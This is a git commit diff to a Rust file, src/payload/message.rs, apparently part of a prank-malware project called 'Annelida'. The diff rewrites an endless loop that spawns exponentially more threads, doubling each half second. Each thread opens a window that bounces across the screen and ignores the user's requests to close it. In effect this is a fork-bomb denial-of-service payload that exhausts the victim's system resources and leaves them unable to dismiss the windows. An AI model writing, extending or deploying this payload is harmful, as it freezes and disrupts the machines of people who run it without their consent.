9969eeb5fbd9e02e5c9fa56d0a0047f09cf5376c
William Knight <williamknight220@gmail.com>
2024-08-17 17:07:58 +1200

    Updated time of thread spawn

--- src/payload/message.rs
+++ src/payload/message.rs
@@ -1,40 +1,72 @@
 use std::thread;
 use std::time::Duration;
-use native_dialog::{MessageDialog, MessageType};
-use winapi::um::winuser::{FindWindowA, SetWindowPos, SWP_NOSIZE};
+use winit::{
+    event::{Event, WindowEvent},
+    event_loop::{ControlFlow, EventLoop},
+    platform::windows::EventLoopExtWindows,
+    window::WindowBuilder,
+};
 use rand::Rng;
 
 // Function to exponentially increase the number of windows that open
 pub fn execute_payload() {
     let mut count: i32 = 1;
     loop {
-        for _ in 1..count {
+        for _ in 0..count {
             thread::spawn(|| {
                 message();
             });
         }
-        count += 1;
-        count *= count;
+        count *= 2;
         thread::sleep(Duration::from_secs_f32(0.5));
     }
 }
 
 // Simple message box window with message for payload
 fn message() {
-    MessageDialog::new()
-        .set_type(MessageType::Info)
-        .set_title("Annelida")
-        .set_text("Temporary payload message :3")
-        .show_alert().unwrap();
+    let event_loop: EventLoop<()> = EventLoop::new_any_thread();
+    let window = WindowBuilder::new()
+        .with_title("Annelida")
+        .with_inner_size(winit::dpi::LogicalSize::new(300.0, 200.0))
+        .build(&event_loop)
+        .unwrap();
 
-    // Set the window position to a random location
-    let hwnd = unsafe { FindWindowA(std::ptr::null(), "Annelida\0".as_ptr() as *const i8) };
-    if !hwnd.is_null() {
-        let mut rng = rand::thread_rng();
-        let x = rng.gen_range(0..1920);
-        let y = rng.gen_range(0..1080);
-        unsafe {
-            SetWindowPos(hwnd, std::ptr::null_mut(), x, y, 0, 0, SWP_NOSIZE);
+    let mut rng = rand::thread_rng();
+    let mut x = rng.gen_range(0..1920);
+    let mut y = rng.gen_range(0..1080);
+    let mut dx = 10;
+    let mut dy = 10;
+
+    thread::spawn(move || loop {
+        // Update the window position
+        window.set_outer_position(winit::dpi::LogicalPosition::new(x, y));
+
+        // Update the coordinates
+        x += dx;
+        y += dy;
+
+        // Bounce off the edges of the screen
+        if x <= 0 || x >= 1920 {
+            dx = -dx;
         }
-    }
+        if y <= 0 || y >= 1080 {
+            dy = -dy;
+        }
+
+        // Delay to control the speed of the movement
+        thread::sleep(Duration::from_millis(50));
+    });
+
+    event_loop.run(move |event, _, control_flow| {
+        *control_flow = ControlFlow::Wait;
+        match event {
+            Event::WindowEvent {
+                event: WindowEvent::CloseRequested,
+                ..
+            } => {
+                
+            }
+            _ => (),
+        }
+    });
 }
